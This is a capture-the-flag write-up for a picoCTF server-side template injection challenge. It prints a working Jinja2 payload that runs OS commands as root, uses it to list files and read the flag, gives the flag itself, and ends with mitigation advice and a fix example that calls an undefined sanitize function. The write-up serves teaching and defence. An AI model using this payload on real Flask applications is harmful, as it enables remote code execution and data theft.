# PicoCTF SSTI Challenge Writeup

## Challenge Information
**Category**: Web Exploitation  
**Challenge**: Server-Side Template Injection (SSTI)  
**Difficulty**: Intermediate  

## Summary
Successfully exploited a Server-Side Template Injection vulnerability in a Python Flask/Jinja2 application to achieve remote code execution and retrieve the hidden flag.

## Methodology

### Phase 1: Reconnaissance
- Accessed the vulnerable web application
- Observed an input field that reflected user-supplied data directly to the page
- Noted this could indicate improper handling of user input

### Phase 2: Vulnerability Detection
**Test Input**: `{{7*7}}`  
**Result**: Output displayed `49`  
**Analysis**: The mathematical operation was executed server-side, confirming template injection vulnerability

### Phase 3: Framework Identification
**Characteristics observed**:
- `{{ }}` syntax for template expressions
- Mathematical evaluation working
- Confirmed as **Jinja2 template engine** (commonly used with Python Flask)

### Phase 4: Exploitation and Privilege Escalation

#### Step 1: Initial Code Execution
**Payload**: 
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
**Result**: 
```
uid=0(root) gid=0(root) groups=0(root)
```
**Analysis**: 
- Successfully executed system commands with root privileges
- `self.__init__.__globals__.__builtins__` chain accessed Python built-in functions
- `__import__('os').popen()` enabled OS command execution

#### Step 2: Directory Enumeration
**Payload**: Modified payload with `ls` command  
**Result**: 
```
__pycache__ app.py flag requirements.txt
```
**Findings**:
- `app.py`: Main application file
- `flag`: Target file containing the flag
- `requirements.txt`: Python dependencies
- `__pycache__`: Python cache directory

#### Step 3: Flag Extraction
**Payload**: Modified payload with `cat flag` command  
**Result**: Retrieved the flag successfully

## Technical Details

### Attack Vector
The vulnerability existed due to **unsafe rendering of user input** in Jinja2 templates. The application directly incorporated user-supplied data into templates without proper sanitization.

### Payload Breakdown
```python
{{ 
  self.__init__                # Access instance initialization
  .__globals__                # Access global namespace
  .__builtins__               # Access Python built-in functions
  .__import__('os')           # Import OS module
  .popen('cat flag')          # Execute system command
  .read()                     # Read command output
}}
```

### Security Impact
- **Remote Code Execution (RCE)**: Full system command execution
- **Privilege Escalation**: Commands executed as root (uid=0)
- **Information Disclosure**: Ability to read arbitrary files
- **System Compromise**: Potential for complete server takeover

## Mitigation Recommendations

### For Developers:
1. **Input Validation**: Sanitize all user inputs before template rendering
2. **Template Sanitization**: Use Jinja2's autoescape feature
3. **Sandboxing**: Implement template sandboxing to restrict access
4. **Least Privilege**: Run application with minimal necessary permissions
5. **Security Headers**: Implement proper security headers

### Code Fix Example:
```python
# Vulnerable Code
from flask import Flask, render_template_string, request
app = Flask(__name__)

@app.route('/')
def index():
    user_input = request.args.get('input', '')
    return render_template_string(user_input)  # UNSAFE

# Secure Code
@app.route('/secure')
def secure():
    user_input = request.args.get('input', '')
    # Sanitize input before rendering
    sanitized_input = sanitize(user_input)
    return render_template_string("{{ safe_input }}", safe_input=sanitized_input)
```

## Key Learnings
1. **SSTI Detection**: Mathematical operations in templates can reveal injection points
2. **Jinja2 Exploitation**: Python's introspection features enable RCE through templates
3. **Privilege Awareness**: Applications often run with higher privileges than necessary
4. **Defense in Depth**: Multiple security layers prevent single-point failures

## Flag
`picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_bdc95c1a}`

## Conclusion
This challenge demonstrates the critical impact of Server-Side Template Injection vulnerabilities. 
The ability to execute arbitrary code through template engines can lead to complete system compromise. 
Developers must implement proper input validation and template security measures to prevent such attacks.

---

**Time to Complete**: ~15 minutes  
**Tools Used**: Web browser, manual testing  
**Skills Demonstrated**: Web vulnerability assessment, SSTI exploitation, Python/Jinja2 knowledge, privilege escalation techniques 
